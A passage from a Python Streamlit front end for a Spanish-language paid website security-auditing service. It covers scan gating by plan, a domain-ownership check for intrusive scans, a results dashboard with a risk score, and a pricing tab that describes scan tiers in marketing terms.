            margin-bottom: 18px;
        }
        .dashboard-eyebrow {
            margin: 0;
            color: #8b949e;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            font-size: 0.78rem;
            font-weight: 600;
        }
        .dashboard-title {
            margin: 10px 0;
            color: #f0f6fc;
            font-size: 2rem;
            line-height: 1.18;
            letter-spacing: 0.3px;
            font-weight: 700;
        }
        .dashboard-subtitle {
            margin: 0 0 22px 0;
            color: #9aa4af;
            font-size: 1.03rem;
            line-height: 1.65;
        }
        .hero-input-label {
            margin: 0 0 8px 0;
            color: #d0d7de;
            font-size: 0.95rem;
            font-weight: 600;
            letter-spacing: 0.2px;
        }
        div[data-testid="stTextInput"] label {
            display: none !important;
        }
        div[data-testid="stTextInput"] input {
            background: #0f141b !important;
            border: 1px solid #30363d !important;
            border-radius: 12px !important;
            color: #f0f6fc !important;
            min-height: 50px;
        }
        div[data-testid="stTextInput"] input:focus {
            border-color: rgba(0,255,204,0.6) !important;
            box-shadow: 0 0 0 2px rgba(0,255,204,0.16);
        }
        div[data-testid="stButton"] > button[kind="primary"] {
            background: linear-gradient(90deg, #00FFCC 0%, #00CCAA 100%) !important;
            color: #03110f !important;
            font-weight: 800 !important;
            border: none !important;
            border-radius: 12px !important;
            min-height: 50px !important;
            box-shadow: 0 10px 24px rgba(0,255,204,0.28);
        }
    </style>
    """, unsafe_allow_html=True)

    col_input, col_dev = st.columns([3, 1])
    with col_input:
        st.markdown("""
            <div class="dashboard-hero">
                <p class="dashboard-eyebrow">Auditoría de Seguridad Enterprise</p>
                <h2 class="dashboard-title">Proteja su superficie digital con una auditoría precisa</h2>
                <p class="dashboard-subtitle">Introduzca su dominio para iniciar un análisis técnico inmediato de exposición y configuración de seguridad.</p>
                <p class="hero-input-label">🔒 URL objetivo</p>
            </div>
        """, unsafe_allow_html=True)
        dom = st.text_input(
            "URL objetivo",
            value=st.session_state.get('dominio_rapido', ''),
            placeholder="https://tu-empresa.com",
            label_visibility="collapsed"
        )
    

    if st.session_state['tokens_pro'] > 0 or st.session_state['tokens_ent'] > 0:
        st.info(f"🪙 **Tu Billetera (Pago por uso):** {st.session_state['tokens_pro']} Escaneos Activos disponibles | {st.session_state['tokens_ent']} Auditorías OWASP disponibles")

    # --- EL CONTRATO DIGITAL (CHECKBOX LEGAL) ---
    st.markdown("<br>", unsafe_allow_html=True)
    acepta_terminos = st.checkbox("⚖️ **Acuerdo de Responsabilidad:** Declaro bajo pena de perjurio que poseo autorización expresa para auditar este objetivo y asumo toda responsabilidad legal derivada de este análisis.")

    email_audit = st.session_state.get("email_usuario", "")
    plan_dash = st.session_state.get("plan_activo", "Basic")
    st.caption(uso_objetivos_mes_texto(email_audit, plan_dash) if email_audit else "")
    
    # --- LÓGICA DE ESCANEO ---
    if st.button("Iniciar Auditoría", type="primary", use_container_width=True):
        if not acepta_terminos:
            st.error("⚠️ **Firma digital requerida:** Debes marcar la casilla de responsabilidad legal para poder iniciar la auditoría.")
        elif dom:
            email_u = (st.session_state.get("email_usuario") or "").strip()
            print(f"[Iniciar Auditoría] st.session_state['email_usuario'] (normalizado) = {email_u!r}")
            if not email_u:
                st.error("No hay email de usuario en sesión. Cierra sesión y vuelve a entrar.")
            else:
                plan = st.session_state.get('plan_activo', 'Basic')

                niveles_por_plan = {
                    "Basic": ["Rápido (Passive)"],
                    "Pro": ["Rápido (Passive)", "Profundo (Active)"],
                    "Enterprise": ["Rápido (Passive)", "Profundo (Active)", "Auditoría Completa (OWASP)"],
                }
                permitidos = niveles_por_plan.get(plan, ["Rápido (Passive)"])
                if nivel not in permitidos:
                    st.error(f"Tu plan **{plan}** no incluye el nivel **{nivel}**. Ajusta el nivel en la barra lateral.")
                else:
                    ok_cuota, msg_cuota = puede_escanear_nuevo_objetivo(email_u, dom, plan)
                    if not ok_cuota:
                        st.error(msg_cuota)
                    else:
                        tiene_acceso = False
                        token_a_gastar = None

                        if nivel == "Auditoría Completa (OWASP)":
                            if plan == 'Enterprise':
                                tiene_acceso = True
                            elif st.session_state['tokens_ent'] > 0:
                                tiene_acceso = True
                                token_a_gastar = 'tokens_ent'
                            else:
                                st.error("🔒 **Acceso Denegado.** Requiere la Suscripción Enterprise o comprar 1 Escaneo Suelto (149€).")
                        
                        elif nivel == "Profundo (Active)":
                            if plan in ['Pro', 'Enterprise']:
                                tiene_acceso = True
                            elif st.session_state['tokens_pro'] > 0:
                                tiene_acceso = True
                                token_a_gastar = 'tokens_pro'
                            else:
                                st.error("🔒 **Acceso Denegado.** Requiere la Suscripción Pro o comprar 1 Escaneo Suelto (39€).")
                        
                        else:
                            tiene_acceso = True

                        dominio_limpio_scan = dom.replace("https://", "").replace("http://", "").split("/")[0]
                        es_intrusivo = nivel in ["Profundo (Active)", "Auditoría Completa (OWASP)"]
                        
                        if tiene_acceso and es_intrusivo:
                            if dominio_limpio_scan not in st.session_state['dominios_verificados']:
                                tiene_acceso = False
                                token_a_gastar = None
                                st.error(f"🛑 **BLOQUEO LEGAL:** No puedes lanzar un ataque intrusivo contra '{dominio_limpio_scan}' porque no has demostrado ser su propietario. Ve a la pestaña 'Mis Activos 🛡️' para verificarlo.")

                        if nivel == "Rápido (Passive)":
                            incluir_puertos = False
                            incluir_cve = False
                            incluir_owasp = False
                        elif nivel == "Profundo (Active)":
                            incluir_puertos = True
                            incluir_cve = True
                            incluir_owasp = False
                        else:
                            incluir_puertos = True
                            incluir_cve = True
                            incluir_owasp = True

                        if tiene_acceso:
                            if token_a_gastar:
                                st.session_state[token_a_gastar] -= 1
                                st.toast(f"🪙 Has gastado 1 escaneo suelto. Te quedan {st.session_state[token_a_gastar]} en la recámara.")
                                time.sleep(1)

                            msg_status = (
                                "🌍 Mapeo de puertos y CVE…" if incluir_puertos and not incluir_owasp
                                else "🔬 Auditoría OWASP" if incluir_owasp
                                else "🕵️ OSINT / DNS y huella HTTP…"
                            )
                            with st.status(f"Iniciando análisis real sobre {dom}...") as s:
                                st.write(msg_status)
                                resultados_auditoria = escanear_objetivo_real(
                                    dom,
                                    incluir_puertos=incluir_puertos,
                                    incluir_cve_matching=incluir_cve,
                                    incluir_owasp=incluir_owasp,
                                )
                                resultados_limpios = []
                                for r in resultados_auditoria:
                                    if r not in resultados_limpios:
                                        resultados_limpios.append(r)
                                resultados_auditoria = resultados_limpios

                                st.write("🔒 Analizando cabeceras de seguridad HTTP…")
                                s.update(label=f"¡Análisis de {dom} completado!", state="complete")

                                if not resultados_auditoria:
                                    st.session_state['resultados_actuales'] = ["No se encontraron vulnerabilidades aparentes."]
                                else:
                                    st.session_state['resultados_actuales'] = resultados_auditoria

                                st.session_state['dominio_actual'] = dom
                                st.session_state['nivel_escaneo_guardado'] = nivel

                                registrar_dominio_cliente(email_u, dom)
                                registrar_objetivo_mes_si_nuevo(email_u, dom)

                                nuevo_escaneo = {
                                    "email_cliente": email_u,
                                    "dominio": dom,
                                    "tipo": nivel,
                                    "fecha": datetime.now().strftime("%d/%m/%Y"),
                                    "riesgo": "Medio",
                                    "resultados_json": json.dumps(resultados_auditoria)
                                }
                                st.session_state['historial_escaneos'].append(nuevo_escaneo)

                                prev_scans = int(st.session_state.get("escaneos_realizados", 0))
                                sync_email = (st.session_state.get("email_usuario") or "").strip()
                                print(
                                    f"[escaneos_realizados] sync_email={sync_email!r} "
                                    f"email_u={email_u!r} match={sync_email == email_u} "
                                    f"prev_scans={prev_scans} nuevo={prev_scans + 1}"
                                )
                                actualizar_usuario_supabase(
                                    sync_email, "escaneos_realizados", prev_scans + 1
                                )

                                try:
                                    supabase.table("escaneos").insert(nuevo_escaneo).execute()
                                    print("¡Datos enviados a Supabase correctamente!")
                                except Exception as e:
                                    print(f"Error al guardar en Supabase: {e}")

                                st.rerun()
        else:
            st.warning("⚠️ Escribe un dominio primero para poder iniciar el escaneo.")

    # --- RESULTADOS Y DESCARGA DE PDF ---
    # --- Recuperar último escaneo desde Supabase si se perdió por redirección de Stripe ---
    if 'resultados_actuales' not in st.session_state:
        try:
            email_recuperar = st.session_state.get("email_usuario", "")
            print(f"[DEBUG recuperar escaneo] email: {email_recuperar}")
            if email_recuperar:
                ultimo = supabase.table("escaneos").select("*").eq("email_cliente", email_recuperar).limit(1).execute()               
                if ultimo.data:
                    r = ultimo.data[0]
                    st.session_state['resultados_actuales'] = json.loads(r.get("resultados_json", "[]"))
                    st.session_state['dominio_actual'] = r.get("dominio", "")
                    st.session_state['nivel_escaneo_guardado'] = r.get("tipo", "Rápido (Passive)")
        except Exception as e:
            print(f"[DEBUG recuperar escaneo] Error: {e}")
            pass

    if 'resultados_actuales' not in st.session_state:
        icono_estado = (
            f'<img src="data:image/png;base64,{logo_b64}" style="width:72px; height:auto; margin-bottom:10px;">'
            if logo_b64 else "🛡️"
        )
        st.markdown(f"""
            <div style="background:#161b22; border:1px solid #30363d; border-radius:12px; padding:36px 26px; text-align:center; margin-top:16px;">
                <div style="font-size:2rem; margin-bottom:10px;">{icono_estado}</div>
                <p style="margin:0; color:#c9d1d9; font-size:1rem; line-height:1.65;">
                    Listo para asegurar su infraestructura. Inicie un escaneo para detectar vulnerabilidades.
                </p>
            </div>
        """, unsafe_allow_html=True)
    if 'resultados_actuales' in st.session_state:
        resultados = st.session_state['resultados_actuales']
        dominio_escaneado = st.session_state['dominio_actual']
        nivel_usado = st.session_state.get('nivel_escaneo_guardado', 'Rápido (Passive)')

        st.markdown("---")
        st.subheader(" Exportar Resultados")
        
        plan_actual = st.session_state.get('plan_activo', 'Basic')

        # LÓGICA MAESTRA: ¿Le damos el PDF?
        # SÍ, si su plan es Pro/Enterprise. O SÍ, si el escaneo que acaba de hacer era un escaneo de pago (usó un token).
        tokens_pdf = st.session_state.get("tokens_pdf", 0)
        tiene_derecho_pdf = plan_actual in ['Pro', 'Enterprise'] or nivel_usado in ["Profundo (Active)", "Auditoría Completa (OWASP)"] or tokens_pdf > 0
        if not tiene_derecho_pdf:
            st.button("🔒 Descargar Reporte en PDF (Pro)", use_container_width=True, disabled=True)
            st.error("🔒 **Función Premium.** Necesitas el Plan Pro para exportar un escaneo Pasivo en formato ejecutivo.")
            
            st.markdown("**Elige cómo quieres desbloquearlo:**")
            col_v1, col_v2 = st.columns(2)
            email_pago = st.session_state.get("email_usuario", "")
            usuario_logueado = bool(st.session_state.get("usuario_autenticado")) and bool(email_pago)
            with col_v1:
                if usuario_logueado:
                    try:
                        url_pdf = generar_link_pago(
                            STRIPE_PRICES["pdf_unico"], email_pago, "pdf_unico", "payment"
                        )
                        st.link_button(" Descargar Reporte Completo (9,99€)", url=url_pdf, use_container_width=True)
                    except Exception as e:
                        st.error(f"No se pudo generar el pago de PDF: {e}")
                else:
                    st.info("Inicia sesión para habilitar el pago.")
            with col_v2:
                if usuario_logueado:
                    try:
                        url_pro = generar_link_pago(
                            STRIPE_PRICES["pro_recurrente"], email_pago, "pro_recurrente", "subscription"
                        )
                        st.link_button(" Mejorar a Plan Pro", url=url_pro, type="primary", use_container_width=True)
                    except Exception as e:
                        st.error(f"No se pudo generar el pago del plan Pro: {e}")
                else:
                    st.info("Inicia sesión para habilitar el pago.")
            st.info("💡 Serás redirigido a la pasarela segura. Una vez completado el pago, tu cuenta se actualizará automáticamente.")

        else:
            st.success("Reporte generado correctamente. Ya puedes descargarlo.")
            pdf_generado = crear_pdf(dominio_escaneado, resultados)
            email_pago = st.session_state.get("email_usuario", "")

            if not st.session_state.get("token_pdf_descontado"):
                if st.download_button(
                    label="⬇️ Descargar Reporte Ejecutivo (.pdf)",
                    data=pdf_generado,
                    file_name=f"Auditoria_{dominio_escaneado.replace('.', '_')}.pdf",
                    mime="application/pdf",
                    use_container_width=True,
                    type="primary"
                ):
                    if tokens_pdf > 0 and plan_actual not in ('Pro', 'Enterprise'):
                        actualizar_usuario_supabase(email_pago, "tokens_pdf", tokens_pdf - 1)
                        st.session_state["tokens_pdf"] = tokens_pdf - 1
                        st.session_state["token_pdf_descontado"] = True
            else:
                st.download_button(
                    label="⬇️ Descargar Reporte Ejecutivo (.pdf)",
                    data=pdf_generado,
                    file_name=f"Auditoria_{dominio_escaneado.replace('.', '_')}.pdf",
                    mime="application/pdf",
                    use_container_width=True,
                    type="primary"
                )
                if tokens_pdf > 0 and plan_actual not in ('Pro', 'Enterprise'):
                    actualizar_usuario_supabase(email_pago, "tokens_pdf", tokens_pdf - 1)
                    st.session_state["tokens_pdf"] = tokens_pdf - 1
        st.markdown("---")
        tab_resumen, tab_plan_accion = st.tabs(["📊 Resumen", "💡 Plan de Acción"])
        
        with tab_resumen:
            # Capa visual premium para el resumen ejecutivo de resultados
            st.markdown("""
                <style>
                    .res-card {
                        background: linear-gradient(170deg, #161b22 0%, #131820 100%);
                        border: 1px solid #30363d;
                        border-radius: 12px;
                        padding: 16px 18px;
                        margin-bottom: 12px;
                    }
                    .res-kicker {
                        margin: 0;
                        color: #8b949e;
                        font-size: 0.74rem;
                        letter-spacing: 1.1px;
                        text-transform: uppercase;
                        font-weight: 700;
                    }
                    .res-title {
                        margin: 6px 0 0 0;
                        color: #f0f6fc;
                        font-size: 1.12rem;
                        font-weight: 700;
                        line-height: 1.25;
                    }
                    .risk-box {
                        background: #0f141b;
                        border: 1px solid #30363d;
                        border-radius: 12px;
                        padding: 14px;
                        margin-bottom: 10px;
                    }
                    .risk-label {
                        color: #8b949e;
                        font-size: 0.8rem;
                        font-weight: 600;
                        letter-spacing: 0.6px;
                        text-transform: uppercase;
                        margin: 0 0 4px 0;
                    }
                    .risk-value {
                        color: #f0f6fc;
                        font-size: 1.55rem;
                        font-weight: 800;
                        line-height: 1.1;
                        margin: 0;
                    }
                    .risk-sub {
                        color: #9aa4af;
                        font-size: 0.86rem;
                        margin: 6px 0 0 0;
                        line-height: 1.45;
                    }
                </style>
            """, unsafe_allow_html=True)

            col_g, col_t = st.columns([1, 1], gap="large")
            with col_g:
                # 1. Conteo preciso basado en tus emojis
                crit_count = sum(1 for r in resultados if "🔴" in r or "🚨" in r)
                med_count = sum(1 for r in resultados if "⚠️" in r or "🟡" in r or "Vulnerabilidad Media" in r)
                
                # 2. Nueva lógica de puntos: Media solo resta 5
                puntos_a_restar = (crit_count * 15) + (med_count * 7)
                nota_final = 100 - puntos_a_restar
                
                # 3. Resultado final para el círculo
                seg_val = max(5, min(100, nota_final))

                # 4. Ajuste de barras visuales
                total_items = crit_count + med_count + 5 # Base para que las barras luzcan bien
                pct_crit = min(100, (crit_count / total_items) * 100)
                pct_med = min(100, (med_count / total_items) * 100)
                pct_seg = seg_val # La barra verde brilla según la nota

                crit_num_html = f"{crit_count}&nbsp;🚨" if crit_count > 0 else "0"

                st.markdown(
                    f"""
                    <style>
                        .exp-card {{
                            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                            background: rgba(30, 33, 48, 0.92);
                            border-radius: 16px;
                            padding: 20px;
                            box-sizing: border-box;
                        }}
                        .exp-head {{
                            display: flex;
                            justify-content: space-between;
                            align-items: center;
                            margin-bottom: 18px;
                        }}
                        .exp-title {{
                            margin: 0;
                            font-size: 1.08rem;
                            font-weight: 700;
                            color: #eceff4;
                            letter-spacing: 0.02em;
                        }}
                        .exp-menu {{
                            color: #8b949e;
                            font-size: 1.25rem;
                            line-height: 1;
                            user-select: none;
                        }}
                        .exp-row {{
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            margin-bottom: 14px;
                        }}
                        .exp-row:last-child {{ margin-bottom: 0; }}
                        .exp-label {{
                            flex: 0 0 15%;
                            width: 15%;
                            text-align: center;
                            font-weight: 600;
                            font-size: 0.88rem;
                        }}
                        .exp-bar-wrap {{
                            flex: 0 0 70%;
                            width: 70%;
                            padding: 0 10px;
                            box-sizing: border-box;
                        }}
                        .exp-bar-track {{
                            background: #33384a;
                            border-radius: 8px;
                            height: 10px;
                            overflow: hidden;
                        }}
                        .exp-bar-fill {{
                            height: 100%;
                            border-radius: 8px;
                            transition: width 0.35s ease;
                        }}
                        .exp-num {{
                            flex: 0 0 15%;
                            width: 15%;
                            text-align: right;
                            font-weight: 700;
                            font-size: 0.95rem;
                            color: #dce1e9;
                        }}
                    </style>
                    <div class="exp-card">
                        <div class="exp-head">
                            <p class="exp-title">Resumen de Exposición Detectada</p>
                            <span class="exp-menu" aria-hidden="true">⋮</span>
                        </div>
                        <div class="exp-row">
                            <span class="exp-label" style="color:#ff5c5c;">Crítico</span>
                            <div class="exp-bar-wrap">
                                <div class="exp-bar-track">
                                    <div class="exp-bar-fill" style="width:{pct_crit}%; background:#ff5c5c;"></div>
                                </div>
                            </div>
                            <span class="exp-num">{crit_num_html}</span>
                        </div>
                        <div class="exp-row">
                            <span class="exp-label" style="color:#ffb347;">Medio</span>
                            <div class="exp-bar-wrap">
                                <div class="exp-bar-track">
                                    <div class="exp-bar-fill" style="width:{pct_med}%; background:#ffb347;"></div>
                                </div>
                            </div>
                            <span class="exp-num">{med_count}</span>
                        </div>
                        <div class="exp-row">
                            <span class="exp-label" style="color:#00e676;">Seguro</span>
                            <div class="exp-bar-wrap">
                                <div class="exp-bar-track">
                                    <div class="exp-bar-fill" style="width:{pct_seg}%; background:#00e676;"></div>
                                </div>
                            </div>
                            <span class="exp-num">{seg_val}</span>
                        </div>
                    </div>
                    """,
                    unsafe_allow_html=True,
                )
            
            with col_t:
                exposicion_score = seg_val
                
                if exposicion_score >= 80:
                    nivel_riesgo = "Óptimo"
                    color_riesgo = "#00FFCC"
                elif 50 <= exposicion_score <= 79:
                    nivel_riesgo = "Moderado"
                    color_riesgo = "#FFBD45"
                else:
                    nivel_riesgo = "Crítico"
                    color_riesgo = "#FF4B4B"

                st.markdown("""
                    <div class="res-card">
                        <p class="res-kicker">Risk Console</p>
                        <p class="res-title">Alertas detectadas</p>
                    </div>
                """, unsafe_allow_html=True)

                st.markdown(f"""
                    <div class="risk-box">
                        <p class="risk-label">Índice de seguridad global</p>
                        <p class="risk-value">{exposicion_score}/100</p>
                        <p class="risk-sub">Nivel de riesgo actual: <span style="color:{color_riesgo}; font-weight:700;">{nivel_riesgo}</span></p>
                    </div>
                """, unsafe_allow_html=True)
            c1, c2, c3 = st.columns(3, gap="small")
            with c1:
                st.metric("Críticas", crit_count, delta=None, help="Hallazgos de impacto alto.")
            with c2:
                st.metric("Medias", med_count, delta=None, help="Hallazgos de impacto medio.")
            with c3:
                st.metric("Seguridad", f"{seg_val}%", delta=None, help="Nivel de configuraciones seguras.")

            if crit_count > 0:
                st.error(f"🔴 Se detectaron {crit_count} vulnerabilidades críticas o puertos expuestos.")
            else:
                st.success("🟢 No se detectaron vulnerabilidades críticas.")

            st.warning(f"🟡 Avisos y revelación de información: {med_count}")

            if seg_val > 0:
                st.success("🟢 Se han detectado protecciones y configuraciones seguras activas.")
            else:
                st.error("🔴 Carencia severa de configuraciones de seguridad base (ej. SSL o Cabeceras).")


        with tab_plan_accion:
            st.write("1. Entregar este informe al responsable de sistemas (CTO).")
            st.write("2. Abordar prioritariamente las alertas críticas.")

# ==========================================
# PESTAÑA 2: ESCANEOS (Tipos y Tarífas + Historial)
# ==========================================
with menu_escaneos:
    # --- CAPA VISUAL PREMIUM (SIN CAMBIAR LÓGICA) ---
    st.markdown("""
    <style>
    .scan-hero {
        background: radial-gradient(1200px 280px at 10% -20%, rgba(0,255,204,0.12), transparent 45%),
                    radial-gradient(900px 220px at 110% -30%, rgba(96,180,255,0.12), transparent 42%),
                    linear-gradient(180deg, #171d26 0%, #121820 100%);
        border: 1px solid #30363d;
        border-radius: 16px;
        padding: 24px 24px 20px 24px;
        margin-bottom: 18px;
    }
    .scan-kicker {
        margin: 0;
        color: #8b949e;
        text-transform: uppercase;
        letter-spacing: 1.3px;
        font-size: 0.75rem;
        font-weight: 700;
    }
    .scan-title {
        margin: 10px 0 8px 0;
        color: #f0f6fc;
        font-size: 1.85rem;
        font-weight: 760;
        letter-spacing: 0.15px;
        line-height: 1.22;
    }
    .scan-subtitle {
        margin: 0;
        color: #9aa4af;
        font-size: 0.98rem;
        line-height: 1.6;
    }
    div[data-testid="stAlert"] {
        transition: all 0.24s ease-in-out;
        border-radius: 14px;
        border: 1px solid #30363d !important;
        box-shadow: 0 8px 24px rgba(0,0,0,0.25);
    }
    div[data-testid="stAlert"]:hover {
        transform: translateY(-5px);
        box-shadow: 0 14px 28px rgba(0,0,0,0.34);
    }
    div[data-testid="column"] div[data-testid="stMarkdownContainer"] h3 {
        color: #f0f6fc;
        font-size: 1.05rem;
        letter-spacing: 0.2px;
        margin-bottom: 6px;
    }
    div[data-testid="stButton"] > button {
        border-radius: 12px !important;
        min-height: 46px !important;
        font-weight: 700 !important;
    }
    div[data-testid="stButton"] > button[kind="primary"] {
        background: linear-gradient(90deg, #00ffcc 0%, #00d8af 100%) !important;
        color: #052019 !important;
        border: none !important;
        box-shadow: 0 10px 22px rgba(0,255,204,0.22);
    }
    div[data-testid="stDataFrame"] {
        border: 1px solid #30363d;
        border-radius: 14px;
        overflow: hidden;
        box-shadow: 0 10px 24px rgba(0,0,0,0.22);
    }
    </style>
    """, unsafe_allow_html=True)

    # --- Perfil: si aún no se cargó desde Supabase, reconciliar (incl. auto-provisioning) ---
    if st.session_state.get("email_usuario") and not st.session_state.get("datos_cliente_cargados"):
        cargar_perfil_usuario(st.session_state["email_usuario"])
    if 'trial_pro_usada' not in st.session_state:
        st.session_state.trial_pro_usada = False 

    st.markdown("""
        <div class="scan-hero">
            <p class="scan-kicker">Pricing Intelligence</p>
            <h2 class="scan-title">Motores de Auditoría y Tarifas</h2>
            <p class="scan-subtitle">Compare capacidades técnicas, impacto operativo y modalidad de contratación para elegir el nivel de auditoría adecuado para su organización.</p>
        </div>
    """, unsafe_allow_html=True)

    col_e1, col_e2, col_e3 = st.columns(3)

    # --- COLUMNA 1: BASIC ---
    with col_e1:
        st.markdown("###  Escaneo Pasivo")
        st.markdown("<h4 style='color: #60b4ff;'>Plan Basic (Gratis)</h4>", unsafe_allow_html=True)
        st.info("""
        **Tecnología Zero-Touch (Sin rastro):**
        - **Headers de Seguridad: Análisis de 6 cabeceras HTTP críticas (HSTS, CSP, X-Frame-Options y más).
        - **DNS & SSL:** Análisis de registros y caducidad de certificados.
        - **Reputación IP:** Comprobación en listas negras globales.
        - ** CDN: Detección de protección mediante Cloudflare y otros CDNs.
        
        **Límites de la cuenta Gratis:**
        - 🎯 **Objetivos:** Máximo 3 dominios/mes.
        - ⏳ **Historial:** Sin retención de datos.
        - 📑 **Reportes:** Resumen básico sin remediación.
        
        **Impacto:** 0%. Totalmente invisible para tus sistemas.
        """)
        
        if st.session_state.get('plan_activo', 'Basic') == 'Basic':
            st.button("✅ Plan Actual (Activo)", disabled=True, use_container_width=True, key="btn_basic_active")
        else:
            if st.button("Bajar al Plan Basic", use_container_width=True, key="btn_basic_downgrade"):
                email_actual = st.session_state.get('email_usuario')
                actualizar_usuario_supabase(email_actual, 'plan_activo', 'Basic')
                
                st.rerun()

    # --- COLUMNA 2: PRO ---
    with col_e2:
        st.markdown("###  Escaneo Activo")
        st.markdown("<h4 style='color: #FFBD45;'>Plan Pro (65€ / mes)</h4>", unsafe_allow_html=True)
        st.warning("""
        **Tecnología Intrusiva (Activa):**
        - **Port & Banner:** Mapeo de puertos y detección del software exacto.
        - **Fuzzing Web:** Búsqueda por fuerza bruta de directorios ocultos.
        - **CVE Matching:** Cruce automático de hallazgos con bases de datos.
        - **SSL/TLS Profundo: Análisis de cipher suites, protocolos obsoletos (TLS 1.0/1.1) y firma SHA-1.
        - **Ficheros Críticos: Detección de archivos sensibles expuestos (.env, .git, backups, configs).
        - **OSINT Emails: Búsqueda de emails corporativos expuestos públicamente.
        - **Fingerprinting: Identificación de tecnologías, CMS, frameworks y CDN.
        - **Subdominios: Enumeración de subdominios expuestos incluyendo entornos dev/staging.
        
        **Ventajas de la cuenta Pro:**
        - 🎯 **Objetivos:** Hasta 25 dominios o IPs al mes.
        - ⏳ **Historial:** Retención de 1 año.
        - 📑 **Reportes:** Nivel técnico con código de remediación (Fixes).
        - ⚡ **Rendimiento:** Prioridad Alta en la cola de escaneo.
        
        **Impacto:** Medio. Generará ruido y quedará registrado en Firewalls.
        """)
        
        if st.session_state.get('plan_activo', 'Basic') == 'Pro':
            st.button("✅ Plan Actual (Activo)", disabled=True, use_container_width=True, key="btn_pro_active")
        else:
            email_pago = st.session_state.get("email_usuario", "")
            usuario_logueado = bool(st.session_state.get("usuario_autenticado")) and bool(email_pago)
# 1. Botón de Suscripción Principal (o prueba gratuita)
            if not st.session_state.get('trial_pro_usada', False):
                if st.button(" Iniciar Prueba Gratuita (14 días)", type="primary", use_container_width=True, key="btn_pro_trial"):
                    st.session_state.trial_pro_usada = True
                    email_actual = st.session_state.get('email_usuario')
                    fecha_hoy = datetime.now().strftime("%Y-%m-%d")

                    actualizar_usuario_supabase(email_actual, 'trial_pro_usada', True)
                    actualizar_usuario_supabase(email_actual, 'plan_activo', 'Pro')
                    actualizar_usuario_supabase(email_actual, 'fecha_inicio_trial', fecha_hoy)
                    
                    st.rerun()
            else:
                if usuario_logueado:
                    try:
                        url_pro_sub = generar_link_pago(
                            STRIPE_PRICES["pro_recurrente"], email_pago, "pro_recurrente", "subscription"
                        )
                        st.link_button(" Suscribirse (65€/mes)", url=url_pro_sub, type="primary", use_container_width=True)
                    except Exception as e:
                        st.error(f"No se pudo generar el pago Pro: {e}")
                else:
                    st.info("Inicia sesión para habilitar el pago.")
            
            # 2. Botón de Venta Única (Downselling)
            st.markdown("<p style='text-align: center; color: #888; font-size: 0.8rem; margin: 5px 0;'>— O PAGO POR USO —</p>", unsafe_allow_html=True)
            if usuario_logueado:
                try:
                    url_pro_unico = generar_link_pago(
                        STRIPE_PRICES["pro_unico"], email_pago, "pro_unico", "payment"
                    )
                    st.link_button(" Comprar Escaneo Único (39€)", url=url_pro_unico, use_container_width=True)
                except Exception as e:
                    st.error(f"No se pudo generar el pago por escaneo Pro: {e}")
            else:
                st.info("Inicia sesión para habilitar el pago.")

    # --- COLUMNA 3: ENTERPRISE ---
    with col_e3:
        st.markdown("###  Auditoría OWASP")
        st.markdown("<h4 style='color: #FF4B4B;'>Enterprise (219€ / mes)</h4>", unsafe_allow_html=True)
        st.error("""
        **Simulación de ataque (Red Team automatizado):**
        - **Inyecciones:** Pruebas enviando payloads (SQLi, XSS, SSRF).
        - **Bypass de WAF:** Técnicas para saltarse tu Cortafuegos web.
        - **Escaneo Autenticado:** Auditoría profunda con usuario/contraseña.
        
        **Ventajas de la cuenta Enterprise:**
        - 🎯 **Objetivos:** Dominios e IPs ilimitados.
        - 🧠 **Monitoreo:** 100% automatizado por bots.
        - 🔔 **Integraciones:** Alertas a Slack/Teams y Webhooks.
        - 📑 **Reportes:** API Access total para tu propio software.
        
        **Impacto:** Alto. Puede provocar ralentizaciones y alertas críticas.
        """)
        
        if st.session_state.get('plan_activo', 'Basic') == 'Enterprise':
            st.button("✅ Plan Actual (Activo)", disabled=True, use_container_width=True, key="btn_ent_active")
        else:
            email_pago = st.session_state.get("email_usuario", "")
            usuario_logueado = bool(st.session_state.get("usuario_autenticado")) and bool(email_pago)
            # 1. Botón de Suscripción Principal
            if usuario_logueado:
                try:
                    url_ent_sub = generar_link_pago(
                        STRIPE_PRICES["enterprise_recurrente"], email_pago, "enterprise_recurrente", "subscription"
                    )
                    st.link_button(" Suscribirse (219€/mes)", url=url_ent_sub, type="primary", use_container_width=True)
                except Exception as e:
                    st.error(f"No se pudo generar el pago Enterprise: {e}")
            else:
                st.info("Inicia sesión para habilitar el pago.")
            
            # 2. Botón de Venta Única (Downselling)
            st.markdown("<p style='text-align: center; color: #888; font-size: 0.8rem; margin: 5px 0;'>— O PAGO POR USO —</p>", unsafe_allow_html=True)
            if usuario_logueado:
                try:
                    url_ent_unico = generar_link_pago(
                        STRIPE_PRICES["enterprise_unico"], email_pago, "enterprise_unico", "payment"
                    )
                    st.link_button(" Comprar Escaneo Único (139€)", url=url_ent_unico, use_container_width=True)
                except Exception as e:
                    st.error(f"No se pudo generar el pago OWASP único: {e}")
            else:
                st.info("Inicia sesión para habilitar el pago.")

    st.markdown("---")
    st.markdown("<br>", unsafe_allow_html=True)
    

# ==========================================
# PESTAÑA 3: REPORTES (Archivo y Descargas)
# ==========================================
with menu_reportes:
    st.markdown("""
    <style>
        .reports-hero {
            background: radial-gradient(1100px 280px at -5% -30%, rgba(96,180,255,0.13), transparent 50%),
                        radial-gradient(900px 240px at 105% -20%, rgba(0,255,204,0.10), transparent 45%),
                        linear-gradient(180deg, #171d26 0%, #121820 100%);
            border: 1px solid #30363d;
            border-radius: 16px;
            padding: 24px 24px 20px 24px;
            margin-bottom: 16px;
            box-shadow: 0 12px 28px rgba(0,0,0,0.26);
        }
        .reports-kicker {
            margin: 0;
            color: #8b949e;
            text-transform: uppercase;
            letter-spacing: 1.3px;
            font-size: 0.75rem;
            font-weight: 700;
        }
        .reports-title {
            margin: 10px 0 8px 0;
            color: #f0f6fc;
            font-size: 1.9rem;
            font-weight: 760;
            letter-spacing: 0.2px;
            line-height: 1.2;
        }
        .reports-subtitle {
            margin: 0;
            color: #9aa4af;
            font-size: 1rem;
            line-height: 1.6;
            max-width: 850px;
        }
        .reports-filter-title {
            margin: 0 0 10px 0;
            color: #d0d7de;
            font-size: 0.95rem;
            font-weight: 700;
            letter-spacing: 0.3px;
            text-transform: uppercase;
        }
        div[data-testid="stSelectbox"] > div[data-baseweb="select"] > div {
            background: #0f141b !important;
            border: 1px solid #30363d !important;
            border-radius: 12px !important;
        }
        div[data-testid="stSelectbox"] > div[data-baseweb="select"] > div:hover {
            border-color: #4a5563 !important;
        }
        .reports-section-title {
            margin: 0;
            color: #f0f6fc;
            font-size: 1.2rem;
